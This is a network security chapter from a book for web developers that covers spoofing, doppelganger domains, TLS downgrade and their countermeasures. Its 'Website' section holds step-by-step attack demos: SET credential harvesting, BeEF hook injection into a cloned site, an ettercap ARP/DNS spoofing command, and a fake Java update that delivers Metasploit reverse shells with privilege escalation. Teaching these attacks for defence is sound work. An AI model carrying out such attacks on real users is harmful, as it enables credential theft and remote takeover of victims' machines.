## 1. SSM Asset Identification
Take results from [higher level Asset Identification](#ssm-asset-identification). Remove any that are not applicable. Add any newly discovered.

Here are some possibilities to get you started:

* Switches: Mainly because of the data that passes through them.
* Routers: Same as above, plus there will be a lot of sensitive network related information stored here.
* Syslog servers: For similar reasons to routers, plus events and sensitive information from all sorts of systems collected in one place.

There will almost certainly be many others. Think about your network topology. What information is stored where and over which channels it may pass. If you have decided to hand your precious data over to a cloud provider, then you are not going to have much control over this and in most cases, your CSP will not have much control either (addressed in the [Cloud](#cloud) chapter). Also think about the areas that may be easier to compromise than others and take this information into the next step.

## 2. SSM Identify Risks
Go through same process as we did at the [top level](#ssm-identify-risks), but for the network.

* [MS Network Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_006)

Network risks are obviously huge. I will be just scratching the surface here at this stage.

### Spoofing {#network-identify-risks-spoofing}

Spoofing on a network is the act of an entity (often malicious(Mallory), [but not necessarily](http://blog.binarymist.net/2015/04/25/web-server-log-management/#mitm)) successfully masquerading/impersonating another (Bob) in order to receive information from Alice (sometimes via Eve) that should then reach Bob.

The following are some of the different types of network spoofing 

#### [IP](http://en.wikipedia.org/wiki/IP_address_spoofing) {#network-identify-risks-spoofing-ip}
![](images/ThreatTags/easy-common-average-severe.png)

Setting the IP address in your header to the victims IP address.

This is where a sending node will spoof its public IP address (not actually change its IP address) (by forging the header) to look like someone else's. When the message is received and a reply crafted, the entity creating the reply will look up its ARP table and send the reply to the impersonated entity because the MAC address is still associated with the IP address of the message it received. This sort of play is commonly used in Denial of Service (DoS) attacks, because the attacker does not need or want the response.

In a Distributed DoS (D-DoS) Often the attacker will impersonate the target (often a router or some server it want to be brought to its knees) and broadcast messages. The nodes that receive these messages consult their ARP tables looking up the spoofed IP address and find the targets associated MAC address and reply to it. This way the replies will be sourced from many nodes. Thus swamping the targets network interface.  
Many load testing tools also use this technique to stress a server or application.

#### ARP (Address Resolution Protocol) {#network-identify-risks-spoofing-arp}
![](images/ThreatTags/easy-common-average-severe.png)

Telling your target that the MAC address it associates with a particular legitimate node (by way of IP address) is now your (the attackers/MitM) MAC address.

Taking the IP spoofing attack further. The MitM sends out ARP replies across the LAN to the target, telling it that the legitimate MAC address that the target associates with the MitM box has now changed to say the routers IP address. This way when the target wants to send a message to say the router, it looks up its ARP table for the routers IP address in order to find its MAC address and now gets the MitM MAC address for the routers IP address, thus the targets ARP cache is said to be poisoned with the MitM MAC address. The target goes ahead and sends its messages to the MitM box which can do what ever it likes with the data. Choose to drop the message or to forward it on to the router in its original or altered state.  
This attack only works on a LAN.  
The attack is often used as a component of larger attacks, harvesting credentials, cookies, CSRF tokens, hijacking. Even using TLS (in many cases TLS can be [downgraded](#network-identify-risks-tls-downgrade)). 

There is a complete cloning example of a website, ARP spoof, DNS spoof and hands on hack, in the [website section below](#network-identify-risks-spoofing-website).

* [MitM with ARP spoofing](http://blog.binarymist.net/2015/04/25/web-server-log-management/#mitm)
* [With TLS](http://frishit.com/tag/ettercap/)

#### DNS {#network-identify-risks-spoofing-dns}
![](images/ThreatTags/difficult-uncommon-average-severe.png)

Affects any domain name lookup. That includes email.
This type of attack could allow an intermediary to intercept and read all company emails for example. Completely destroying any competitive advantage. The victim may never know it is happened.  
DNS spoofing refers to an end goal rather than a specific type of attack. There are many ways to spoof a name server.

* Compromise the name server itself potentially through it is own vulnerabilities ([Kaminsky bug](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447) for example)
* Poison the cache of the name server
* Poison the cache of an upstream name server and wait for the downstream propagation
* MitM attack. A good example of this is:
  * cloning a website you hope your victim will visit
  * offering a free Wi-Fi hot-spot attached to your gateway with DNS server provided.
 Your DNS server provides your cloned website IP address. You may still have to deal with X.509 certificates though, unless the website enforces TLS across the entire site, which is definitely my recommendation. If not, and the potential victim already has the websites certificate they are wanting to visit in their browser, then you will have to hope your victim will click through the warning or work out a TLS downgrade which is going to be harder.

There is a complete cloning example of a website, ARP spoof, DNS spoof and hands on hack, in the [website section below](#network-identify-risks-spoofing-website)

[dnschef](http://www.question-defense.com/2012/12/14/dnschef-backtrack-privilege-escalation-spoofing-attacks-network-spoofing-dnschef) is a flexible spoofing tool, also available in Kali Linux. Would be interesting to test on the likes of Arpon and Unbound.

#### Referrer {#network-identify-risks-spoofing-referrer}
![](images/ThreatTags/easy-common-average-moderate.png)

This comes under the [OWASP Top 10 A7 Missing Function Level Access Control](https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control)

Often websites will allow access to certain resources so long as the request was referred from a specific page defined by the `referer` header.  
The referrer (spelled `referer`) field in HTTP requests can be intercepted and modified, so it is not a good idea to use it for authentication or authorisation.

#### EMail Address {#network-identify-risks-spoofing-email-address}
![](images/ThreatTags/easy-widespread-average-moderate.png)

The act of creating and sending an email with a forged sender address.
This is useful for spam campaigns sending large numbers of email and for social engineers often sending small numbers of email. The headers can be specified easily on the command line. The tools used essentially modify the headers: `From` and `Reply-To`.
<!--Useful inof on the From, Reply-To and Return-Path fields http://stackoverflow.com/questions/1235534/what-is-the-behavior-difference-between-return-path-reply-to-and-from-->
The Social Engineer Toolkit (SET) can be handy for sending emails that appear to be from someone the receiver expects to receive email from. Set is capable of doing many tasks associated with social engineering. It even provides the capability to create executable payloads that the receiver may run once opening the email. Payloads in the form of a pdf with embedded exe, which Set allows you to choose form having Set do all the work for you, or you supplying the custom payload and file format.

Most people just assume that an email they have received came from the address it appears to be sent from. The Email headers are very easy to tamper with.
Often other types of spoofing attacks are necessary in order to have the `From` and `Reply-To` set to an address that a victim recognises and trusts rather than the attackers address or some other obviously obscure address.

There are also [on-line services](http://www.anonymailer.net/) that allow the sending of email and specifying any from address.

Often the sender of a spoofed email will use a from address that you recognise in hope that you will click on a link within the email thus satisfying their phish.

#### Website {#network-identify-risks-spoofing-website}
![](images/ThreatTags/difficult-common-average-severe.png)

<!---Todo: Check out Subterfuge, mentioned in "Basic Security Testing With Kali Linux"-->
<!---Todo: pg 160 of "The Hacker Playbook" could be worth demoing here-->
An attacker can clone a legitimate website (with the likes of the Social Engineering Kit (SET)) or the Browser Exploitation Framework (BeEF) and through [social engineering](#people), phishing, email spoofing or any other number of tricks, coerce a victim to browse the spoofed website. In fact, if you clone a website that you know your victim visits regularly, then you can just do that and sit and wait for them to take the bait. Better still automote your attack so that when they do take the bait exploits are fired at them automatically. Once the victim is on the spoofed website, the attacker can harvest credentials or carry out many other types of attacks against the non-suspecting user.

The victim may visit the attackers cloned website due to ARP and/or DNS spoofing. Subterfuge is handy to run a plethora of attacks against the victims browser through the likes of the Metasploit Browser AutoPwn module. If >0 attacks are successful (we have managed to install a root-kit), the attacker will usually get a remote command shell to the victims system by way of reverse or bind shell. Then simply forward them onto the legitimate website without them even being aware of the attack.

{#wdcnz-demo-3}
![](images/HandsOnHack.png)

The following attack was one of five that I demonstrated at WDCNZ in 2015. The two leading up to this one provide some context and it is probably best to look at them first if you have not already.

You can find the video of how it is played out [here](https://www.youtube.com/watch?v=ymnqTrnF85M).

I> ## Synopsis
I>
I> The average victim will see a valid URL and the spoof will be undetectable.  
I> Use a website that you know victim is likely to spend some time at. This can make it easier if you are running exploits manually in BeEF.  
I> Can be used to obtain credentials or simply hook with BeEF and run any number of exploits.  
I> SET would be run on the website you want to clone. As SET only gets the index file, you will have to use the likes of `wget` to get any other missing resources you need to complete the website. Static sites are obviously the easiest. We do not really want to have to create a back-end for the cloned website. You may have to update some of the links to external resources as well in the index.html file that SET creates.  
I> Ideally you will have cleaned out the public web directory that apache hosts from `/var/www/`. If you do not, I think SET archives everything in there.  
I> You can also leverage ARP and DNS spoofing with Ettercap.

{icon=bomb}
G> ## The Play
G>
G> Run `setoolkit`
G>
G> Choose:  
G> `2) Website Attack Vectors`
G>
G> `3) Credential Harvester Attack Method`
G>
G> `2) Site Cloner`
G>
G> Enter the IP address you want to host from. This will probably be the machine you are running these commands from. Although you could host anywhere.
G>
G> Enter the URL to clone.
G>
G> `y` to start apache.
G>
G> Here you will need to either `wget` any files your missing if you are missing some, or if there are only a small number, just grab them out of your browser developer tools.
G>
G> Add the BeEF hook (`<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>`) into the index.html in `/var/www/` usually at the end of the body, just before the `</body>` tag.
G>
G> From the directory that you have BeEF installed, run the BeEF ruby script: `./beef`
G>
G> Add an 'A' record of the website you ave just cloned and want to spoof into ettercaps dns file: `echo "<domainname-you-want-to-clone.com> A <IP address that is hosting the clone>" >> /etc/ettercap/etter.dns`
G>
G> Now run ettercap which is going to both ARP and DNS spoof your victim and the victims gateway with the MITM option, using dns_spoof plugin: `ettercap -M arp:remote -P dns_spoof -q -T /<gateway IP address>/ /<victim IP address>/`.
G>
G> You can now log into the BeEF web UI.
G>
G> Now when the victim visits your cloned web site, the URL will look legitimate and they will have no idea that their browser is a BeEF zombie continually asking it is master (the BeEF communications server) what to execute next.

T> ## BeEF Can Also Clone
T>
T> BeEF can also be used to clone web sites using its REST API, but it takes more work. The below on using BeEF to do this is only if you really have to.
T>
T> In order to clone, once you have BeEF running:  
T> `curl -H "Content-Type: application/json: charset=UTF-8" -d '{"url":"http://<domainname-you-want-to-clone.com>", "mount":"/"}' -X POST http://127.0.0.1/api/seng/clone_page?token=<token that BeEF provides when you start it up each time>;`  
T> The loop-back IP address is just the address that the BeEF REST API is listening on.  
T> When you run this command, you should get back:  
T> `{"success":true,"mount":"/"}`,  
T> BeEF should also say that it is cloning page at URL:  
T> `http://<domainname-you-want-to-clone.com>` with other information.  
T>
T> As with SET, if any resources other than a single index.html are required,
then they also have to be acquired separately. With BeEF, they need to be copied into:  
T> `/usr/share/beef-xss/extensions/social_engineering/web_cloner/cloned_pages/`.  
T> Routes have to be created in:  
T> `/usr/share/beef-xss/extensions/social_engineering/web_cloner/interceptor.rb`  
T> and also modified to add new [config "hook"](http://sourceforge.net/p/piwat/WAT-Pentoo/ci/6402fce4c6966639927acb72c516edd203c41b77/tree/bin/beef/extensions/social_engineering/web_cloner/web_cloner.rb#l17),  
T> also added to `/usr/share/beef-xss/config.yaml`.  
T> Within the same config.yaml file `host` seems to serve two purposes. The address to access beef and where to fetch hook.js from. If I use an external address, beef only listens on the external interface (can not reach via loopback). So I added a `hook` config which is the address that the beef communications server is listening on that gets inserted into the cloned web page.

{#wdcnz-demo-4}
![](images/HandsOnHack.png)

The following attack was the fourth of five that I demonstrated at WDCNZ in 2015. The [previous demo](#wdcnz-demo-3) will provide some additional context and it is probably best to look at it first if you have not already.

You can find the video of how it is played out [here](https://www.youtube.com/watch?v=WSwqNb_94No).

I> ## Synopsis
I>
I> This demo differs from the previous in that the target will be presented with a Java "needs to be updated" pop-up. When the target plays along and executes what they think is an update, they are in fact starting a reverse shell to the attacker.  
I> The website you choose to clone does not have to be one that the attacker spends much time on. All that is needed is for the attacker to have done their reconnaissance and know which web sites the target frequently visits. Clone one of them. Then wait for the target to fetch it. Then succumb to the attackers bait by clicking the "Update" or "Run this time" button.  
I> You can also leverage ARP and DNS spoofing with Ettercap from the previous attack. I have not included these steps in this play though, although the video assume they have been included.

{icon=bomb}
G> ## The Play
G>
G> Start postgresql:  
G> `service postgresql start`
G>
G> Start the Metasploit service:  
G> `service metasploit start`
G>
G> Start the Social Engineering Toolkit:  
G> `setoolkit`
G>
G> Choose:  
G> `1) Social-Engineering Attacks`
G>
G> `2) Website Attack Vectors`
G>
G> `6) Multi-Attack Web Method`
G>
G> `2) Site Cloner`
G>
G> Do not need NAT/Port forwarding.
G>
G> Enter the IP address that Metasploit will be listening on. That is the IP address that you are launching the attack from.
G>
G> Enter `https://gmail.com` as the URL to clone.
G>
G> Turn on `1. Java Applet Attack Method` & `2. Metasploit Browser Exploit Method`.  
G> Proceed with the attack.  
G> The website is now cloned.  
G>
G> Select the vulnerabilities to exploit: `2) Meterpreter Multi-Memory Injection`.  
G>
G> Select the payloads to deliver. Select them all.  
G> Confirm Port 443 to help disguise the reverse connection as legit.  
G> The payloads are now encrypted and the reverse shells configured.  
G>
G> Take the easy option of `(2) Java Applet`
G>
G> Select `Metasploit Browser Autopwn` for the Java Applet browser exploit.  
G> The cloned site is hosted -> msfconsole is started.
G>
G> Target fetches our spoofed gmail.  
G> Oh… we have a Java update.  
G> Now we know we are always supposed to keep our systems patched right?  
G> Better update.
G>
G> Anti-virus (AV) says we are all safe. Must be all good.  
G> A PowerShell exploit fails.  
G>
G> Here come the shells.  
G> Interact with the first one:
G> `sessions -i 1`
G>
G> Attempt to elevate privileges:  
G> `getsystem`  
G> Does not work on this shell.

{icon=bomb}
G> Let us list the available meterpreter extensions to make sure we have `priv`.  
G> `use -l`  
G> and priv is in the list.  
G> Now that we know we have [priv](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/), we can:
G>
G> `run bypassuac`  
G> Now that is successful, but AV detects bad signatures on some of the root-kits. On this shell I only got the privileges of the target running the browser exploit.

### Doppelganger Domains {#network-identify-risks-doppelganger-domains}

Often domain consumers (people: sending emails, browsing websites, SSHing, etc) miss type the domain. The most common errors are leaving '.' out between the domain and sub domain. Even using incorrect country suffixes. Attackers can take advantage of this by purchasing the miss typed domains. This allows them to intercept requests with: credentials, email and other sensitive information that comes their way by unsuspecting domain consumers.

#### Web-sites {#network-identify-risks-doppelganger-domains-websites}
![](images/ThreatTags/easy-common-average-moderate.png)

Useful for social engineering users to a spoofed web-site. The attacker may not be able to spoof the DNS entries, although this is the next best thing. For example `accountsgoogle.co.nz` could look reasonably legitimate for a New Zealand user intending to sign into their legitimate google account at `accounts.google.com`. In fact at the time of writing, this domain is available. Using the methods described in the Website section to clone and host a site and convince someone to browse to it with a doppelganger domain like this is reasonably easy.

![](images/accountsgoogle-available.jpg)

#### SMTP {#network-identify-risks-doppelganger-domains-smtp}
![](images/ThreatTags/average-common-difficult-moderate.png)

1. By purchasing the doppelganger (miss typed) domains
2. configuring the mail exchanger (MX) record
3. setting up an SMTP server to catch all
    1. record
    2. modify the to address to the legitimate address
    3. modify the from address to the doppelganger domain that the attacker owns (thus also intercepting the mail replies)
    4. forward (essentially MITM).

The attacker gleans a lot of potentially sensitive information.

#### SSH {#network-identify-risks-doppelganger-domains-ssh}
![](images/ThreatTags/average-common-difficult-severe.png)

Less traffic, but if/when compromised, potentially much larger gains. You do not get better than shell access. Especially if they have not disallowed root.

Setup the DNS A record value to be the IP address of the attackers SSH server and the left most part of the name to be "*", so that all possible substitutions that do not exist (not just that do not have any matching records) will receive the attackers SSH server IP address. The DNS wild-card rules are complicated.

An SSH server needs to be set-up to record the user-names and passwords. The OpenSSH code needs to be modified in order to do this.

![](images/HandsOnHack.png)

### Wrongfully Trusting the Loading of Untrusted Web Resources {#network-identify-risks-wrongfully-trusting-the-loading-of-untrusted-web-resources}
![](images/ThreatTags/average-verywidespread-easy-moderate.png)

By default, the browser allows all resources from all locations to be loaded. What would happen if one of those servers was compromised or an attacker was tampering with the payload potentially changing what was expected for something malicious to be executed once loaded?

![](images/HandsOnHack.png)

### TLS Downgrade {#network-identify-risks-tls-downgrade}
![](images/ThreatTags/average-common-average-severe.png)

When ever a user browses to a website, an attacker can intercept the request before the TLS handshake is made and redirect the user to the same website but without the TLS.

This is a danger for all websites that do not enforce TLS for every page. For example many websites are run over plain HTTP until the user wants to log-in. At which point the browser issues a request to an HTTPS resource (that is listed on an unencrypted page). These requests can easily be intercepted and downgraded to a plain HTTP request.

### Lack of Visibility

#### Network Intrusion Detection Systems (NIDS)
Similar to [HIDS](#host-intrusion-detection-systems-hids) but acting as a network spy with its network interface (NIC) in promiscuous mode, capturing all traffic crossing the specific network segment that the NIDS is on.

As HIDS, NIDS also operate with signatures.

1. String signatures look like known attack strings or sub-strings. "_For example, such a string signature in UNIX can be "cat "+ +" > /.rhosts" , which if executed, can cause the system to become extremely vulnerable to network attack._" 
2. Port: "_Port signatures commonly probes for the connection setup attempts to well known, and frequently attacked ports. Obvious examples include telnet (TCP port 23), FTP (TCP port 21/20), SUNRPC (TCP/UDP port 111), and IMAP (TCP port 143). If these ports aren't being used by the site at a point in time, then the incoming packets directed to these ports are considered suspicious._"
3. Header condition: "_Header signatures are designed to watch for dangerous or illegitimate combinations in packet headers fields. The most famous example is Winnuke, in which a packet's port field is NetBIOS port and one of the Urgent pointer, or Out Of Band pointer is set. In earlier version of Windows, this resulted in the "blue screen of death". Another well known such header signature is a TCP packet header in which both the SYN and FIN flags are set. This signifies that the requestor is attempting to start and stop a connection simultaneously._"

Quotes from the excellent [Survey of Current Network Intrusion Detection Techniques](http://www1.cse.wustl.edu/~jain/cse571-07/ftp/ids/index.html)

Some NIDS go further to not only detect but prevent. They are known as Network Intrusion Prevention Systems NIPS.

It is a good idea to have both Host and Network IDS/IPS in place at a minimum. I personally like to have more than one tool doing the same job but with different areas of strength covering the weaker areas of its sibling. An example of this is with HIDS. Having one HIDS on the system it is protecting and another somewhere else on the network, or even on another network completely, looking into the host and performing its checks. This makes discoverability difficult for an attacker.

### Spoofing {#network-countermeasures-spoofing}

#### IP {#network-countermeasures-spoofing-ip}
![](images/ThreatTags/PreventionDIFFICULT.png)

Filter incoming packets (ingress) that appear to come from an internal IP address at your perimeter.  
Filter outgoing packets (egress) that appear to originate from an invalid local IP address.  
Not relying on IP source address's for authentication (AKA trust relationships). I have seen this on quite a few occasions when I was younger and it did not feel right, but I could not put my finger on why? Now it is obvious.

#### ARP (Address Resolution Protocol) {#network-countermeasures-spoofing-arp}
![](images/ThreatTags/PreventionAVERAGE.png)

Use spoofing detection software.  
As ARP poisoning is quite noisy. The attacker continually sends [ARP packets](http://en.wikipedia.org/wiki/Address_Resolution_Protocol), IDS can detect and flag it. Then an IPS can deal with it.

Tools such as free and open source [ArpON (ARP handler inspection)](http://arpon.sourceforge.net/) do the whole job plus a lot more.  
There is also [ArpWatch](http://linux.die.net/man/8/arpwatch) and others.

Thoughts on [mitigations](http://www.jaringankita.com/blog/defense-arp-spoofing)

#### DNS {#network-countermeasures-spoofing-dns}
![](images/ThreatTags/PreventionAVERAGE.png)

Many cache poisoning attacks can be prevented on DNS servers by being less trusting of the information passed to them by other DNS servers, and ignoring any DNS records passed back which are not directly relevant to the query.

[DNS Security Extensions](http://www.dnssec.net/) does the following for us. You will probably need to configure it though on your name server(s). I did.

* DNS cache poisoning
* Origin authentication of DNS data
* Data integrity
* Authenticated denial of existence

Make sure your [Name Server](http://www.dnssec.net/software) supports DNSSEC.

#### Referrer {#network-countermeasures-spoofing-referrer}
![](images/ThreatTags/PreventionEASY.png)

Deny all access by default. Require explicit grants to specific roles for access to every function. Implement checks in the controller and possibly the business logic also (defence in depth). Never trust the fact that certain resources appear to be hidden so a user wont be able to access them. 

Check the [OWASP Failure to Restrict URL Access](https://www.owasp.org/index.php/Top_10_2007-Failure_to_Restrict_URL_Access) for countermeasures and the [Guide to Authorisation](https://www.owasp.org/index.php/Guide_to_Authorization).

#### EMail Address {#network-countermeasures-spoofing-email-address}
![](images/ThreatTags/PreventionDIFFICULT.png)

Spoofing of Email will only work if the victims SMTP server does not perform reverse lookups on the hostname.

Key-pair encryption helps somewhat. The headers can still be spoofed, but the message can not, thus providing secrecy and authenticity:

* GPG/PGP (uses "web of trust" for key-pairs)  
Application Layer  
Used to encrypt an email message body, any file for that matter and also signing.  
Email headers not encrypted

* S/MIME (uses Certificate Authorities (CAs)(Can be in-house) TLS using PKI)  
Application Layer  
Used to encrypt an email message body and also signing  
Email headers not encrypted

The way the industry is going currently it is looking like the above (same) key-pair encryption will probably be replaced with Forward Secrecy who's key changes on each exchange.

GPG/PGP and S/MIME are similar concepts. Both allow the consumer to encrypt things inside an email.  
See my detailed post on GPG/PGP [here](http://blog.binarymist.net/2015/01/31/gnupg-key-pair-with-sub-keys/) for more details.

I have noticed some confusion surrounding S/MIME vs TLS.
TLS works at the transport & session layer as opposed to S/MIME at the Application Layer. The only similarity I see is that they both use CAs.

* Adjust your spam filters
* Read your message headers and trace IP addresses, although any decent self respecting spammer or social engineer is going to be using proxies.
* Do not click links or execute files from unsolicited emails even if the email appears to be from someone you know. It may not be.
* Make sure your mail provider is using [Domain-based Message Authentication, Reporting and Conformance (DMARC)](http://dmarc.org/)
  * Sender Policy Framework (SPF)
  * DomainKeys Identified Mail (DKIM)

#### Website {#network-countermeasures-spoofing-website}
![](images/ThreatTags/PreventionAVERAGE.png)

There is nothing to stop someone cloning and hosting a website. The vital part to getting someone to visit an attackers illegitimate website is to either social engineer them to visit it, or just clone a website that you know they are likely to visit. An Intranet at your work place for example. Then you will need to carry out ARP and/or DNS spoofing. Again
tools such as free and open source [ArpON (ARP handler inspection)](http://arpon.sourceforge.net/) cover website spoofing and a lot more.

### Doppelganger Domains {#network-countermeasures-doppelganger-domains}

Purchase as many doppelganger domains related to your own domain as makes sense and that you can afford.  
Do what the attacker does on your internal DNS server.

#### Web-sites {#network-countermeasures-doppelganger-domains-websites}
![](images/ThreatTags/PreventionAVERAGE.png)

#### SMTP {#network-countermeasures-doppelganger-domains-smtp}
![](images/ThreatTags/PreventionAVERAGE.png)

Seup your own internal catch-all SMTP server to correct miss typed domains before someone else does.

#### SSH {#network-countermeasures-doppelganger-domains-ssh}
![](images/ThreatTags/PreventionAVERAGE.png)

Do not miss type the domain.  
Use [key pair authentication](http://blog.binarymist.net/2010/04/06/a-few-steps-to-secure-a-freenas-server/) so no passwords are exchanged.

### Wrongfully Trusting the Loading of Untrusted Web Resources {#network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources}

* Escaping all untrusted data based on its context (where and what it is)
* White-list
* Constrain to types where possibly
* Constrain max / min lengths.
* Basically think in terms of least privilege

[OWASP Top 10 A3 Cross Site Scripting (XSS)](https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS))

#### Content Security Policy (CSP) {#network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources-csp}
![](images/ThreatTags/PreventionEASY.png)

By using CSP, we are providing the browser with a white-list of the types of resources and from where, that we allow to be loaded.  
We do this by specifying particular response headers (more specifically directives).

Names removed to save embarrassment. Sadly most banks do not take their web security very seriously. They seem to take the same approach as credit card companies. At this stage it appears to be cheaper to reimburse victims rather than make sure targets never get victimised in the first place. I think this strategy will change as cybercrimes become more prevalent and it becomes cheaper to reduce the occurrences than to react once they have happened.

{linenos=off}
    curl --head https://reputable.kiwi.bank.co.nz/

    Content-Security-Policy: default-src 'self' secure.reputable.kiwi.bank.co.nz;
    connect-src 'self' secure.reputable.kiwi.bank.co.nz;
    frame-src 'self' secure.reputable.kiwi.bank.co.nz player.vimeo.com;
    img-src 'self' secure.reputable.kiwi.bank.co.nz *.g.doubleclick.net www.google.com www.google.co.nz www.google-analytics.com seal.entrust.net;
    object-src 'self' secure.reputable.kiwi.bank.co.nz seal.entrust.net;
    # In either case, authors SHOULD NOT include either 'unsafe-inline' or data: as valid sources in their policies. Both enable XSS attacks by allowing code to be included directly in the document itself
    # unsafe-eval should go without saying
    script-src 'self' 'unsafe-eval' 'unsafe-inline' secure.reputable.kiwi.bank.co.nz seal.entrust.net www.googletagmanager.com www.googleadservices.com www.google-analytics.com;
    style-src 'self' 'unsafe-inline' secure.reputable.kiwi.bank.co.nz seal.entrust.net;



Of course this is only as good as a clients connection is trusted. If the connection is not over TLS, then there is no real safety that the headers can not be changed. If the connection is over TLS, but the connection is intercepted before the TLS hand-shake, the same lack of trust applies. See the section on [TLS Downgrade](#network-countermeasures-tls-downgrade) for more information.  
Not to be confused with Cross Origin Resource Sharing (CORS). CORS instructs the browser to over-ride the "same origin policy" thus allowing AJAX requests to be made to header specified alternative domains. For example: web site a allows restricted resources on its web page to be requested from another domain outside the domain from which the resource originated. Thus specifically knowing and allowing specific other domains access to its resources.

  * [W3C specification 2](http://www.w3.org/TR/CSP2). It is the specification after all. Not sure about browser support here yet.  
 _Todo: write script that performs feature detection of version 2 of the specification._
  * [W3C specification 1.1](http://www.w3.org/TR/2014/WD-CSP11-20140211/). Most browsers currently [support](http://caniuse.com/contentsecuritypolicy) this version. IE 11 has partial support.

#### Sub-resource Integrity (SRI) {#network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources-sri}
![](images/ThreatTags/PreventionEASY.png)

Provides the browser with the ability to verify that fetched resources (the actual content) have not been tampered with, potentially swapping the expected resource or modifying it for a malicious resource, no matter where it comes from.

How it plays out:  
Requested resources also have an attribute `integrity` with the cryptographic hash of the expected resource. The browser checks the actual hash against the expected hash. If they do not match the requested resource will be blocked.

{linenos=off}
    <script src="https://example.com/example-framework.js"
        integrity="sha256-C6CB9UYIS9UJeqinPHWTHVqh/E1uhG5Twh+Y5qFQmYg="
        crossorigin="anonymous"></script>


This is of course only useful for content that changes rarely or is under your control. Scripts that are dynamically generated and out of your control are not really a good fit for SRI. If they are dynamically generated as part of your build, then you can also embed the hash into the requesting resource as part of your build process. 
Currently `script` and `link` tags are supported. Future versions of the specification are likely to expand this coverage to other tags.

SRI is also useful for applying the hash of the likes of minified, concatenated and compressed resources to the name of them for invalidating browser cache.

SRI can be used right now. Only the latest browsers are currently supporting SRI, but the extra attributes are simply ignored by browsers that do not currently provide support.

Tools such as openssl and the standard sha[256|512]sum programmes normally supplied with your operating system will do the job. The hash value provided needs to be base64 encoded.

### TLS Downgrade {#network-countermeasures-tls-downgrade}

#### HTTP Strict Transport Security (HSTS) {#network-countermeasures-tls-downgrade-hsts}
![](images/ThreatTags/PreventionEASY.png)

Trust the browser to do something to stop these **downgrades**.

{linenos=off}
    curl --head https://reputable.kiwi.bank.co.nz/
    
    Strict-Transport-Security: max-age=31536000


By using the HSTS header, you are telling the browser that your website should never be reached over plain HTTP.  
There is however still a problem with this. The very first request for the websites page. At this point the browser has no idea about HSTS because it still has not fetched that first page that will come with the header. Once the browser does receive the header, if it does, it records this information against the domain.  
Welcome to [HSTS Preload](#network-countermeasures-tls-downgrade-hsts-preload)

* [Another Slide Deck](https://speakerdeck.com/fmarier/integrity-protection-for-third-party-javascript) from Francois Marier. Also covering HTTP Strict Transport Security (HSTS)
* MDN easily digestible [help](https://developer.mozilla.org/en-US/docs/Web/Security/HTTP_strict_transport_security) on using HSTS
* Easy Reading: [OWASP](https://www.owasp.org/index.php/HTTP_Strict_Transport_Security)
* [IETF specification](https://tools.ietf.org/html/draft-ietf-websec-strict-transport-sec-14). Most browsers currently have support. IE < 12 does not. 12 is [expected to](http://blogs.msdn.com/b/ie/archive/2015/02/16/http-strict-transport-security-comes-to-internet-explorer.aspx).

[Online Certificate Status Protocol (OCSP)](https://github.com/binarymist/HolisticInfoSec-For-WebDevelopers/wiki/CertificateRevocation#initiative-2-online-certificate-status-protocol-ocsp) is very similar to HSTS, but at the X.509 certificate level.

#### HTTP Strict Transport Security (HSTS) Preload {#network-countermeasures-tls-downgrade-hsts-preload}
![](images/ThreatTags/PreventionEASY.png)

This includes a list that browsers have with any domains that have been submitted. When a use requests one of the pages from a domain on the browsers HSTS preload list, the browser will always initiate all requests to that domain over TLS.

In order to have your domain added to the browsers preload list, submit it [here](https://hstspreload.appspot.com/).

[OCSP Must-Staple](https://github.com/binarymist/HolisticInfoSec-For-WebDevelopers/wiki/CertificateRevocation#initiative-4-fix-to-the-ocsp-stapling-problem) is very similar to HSTS Preload, but at the X.509 certificate level.

### Firewall/Router {#network-countermeasures-firewall-router}
I do not trust commercial proprietary routers. I have seen too many vulnerabilities in them to take them seriously for any network I have control of. Yes open source hardware and software routers can and do have vulnerabilities, but they can be patched. There are a few good choices here. Some of which also come with enterprise support if you want it. This means the software and the hardware, if you choose to obtain the hardware as well is open to inspection. The vendor also supplies regular firmware updates which is crucial for there to be any hope of having a system that in some way resembles a device that places a priority on your networks security.

Most closed routers suffer from the [same problems](https://securityevaluators.com/knowledge/case_studies/routers/soho_service_hacks.php) I illustrate on my blog. They have active unsecured services that have little to nothing to do with routing and in many cases, you can not [Disable](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#disable-services-we-dont-need), [Remove](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#remove-services), or [Harden](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#secure-services) them.

### Component Placement {#network-countermeasures-component-placement}

_Todo_

Consider putting resources like data-stores in a secluded segment. VLAN or physical, but isolate them as much as possible.
https://www.owasp.org/index.php/Configuration#Database_security
Also consider using Linux containers, thus providing more isolation, making compromise just a little more time consuming.


### Wire Inspecting {#network-countermeasures-wire-inspecting}

%% Linked to from web applications chapter

_Todo_

Here we want to discuss possible sensitive information flowing through your network. Authentication requests and data transmission for many things. Your web applications data-store (web app sitting in DMZ, data store on another segment), SMB, obtaining hashes, email accounts, any communications between machines (consider using SSH and/or SSL for everything to prevent the data from being intercepted and possibly modified over the wire. Consider internal networks just as malicious as the internet) syslog servers, health monitoring services, many things. Show a few tools that we can use and how to use them. Ethereal, Wireshark, http intercepting proxies.

### Wrongfully Trusting the Loading of Untrusted Web Resources {#network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources}

#### Content Security Policy (CSP) {#network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources-csp}

Trusting the (all supported) browser(s) to do the right thing.  
Don't. Remember defence in depth. Expect each layer to fail, but do your best to make sure it does not. Check the likes of the OWASP [How Do I Prevent Cross-Site Scripting](https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)) for taking the responsibility yourself rather than deferring to trust the clients browser.

Take care in making sure all requests are to HTTPS URLs. You could also automate this as part of your linting procedure or on a pre-commit hook on source control.

Make sure your web server only ever responds over HTTPS, including the very first response.

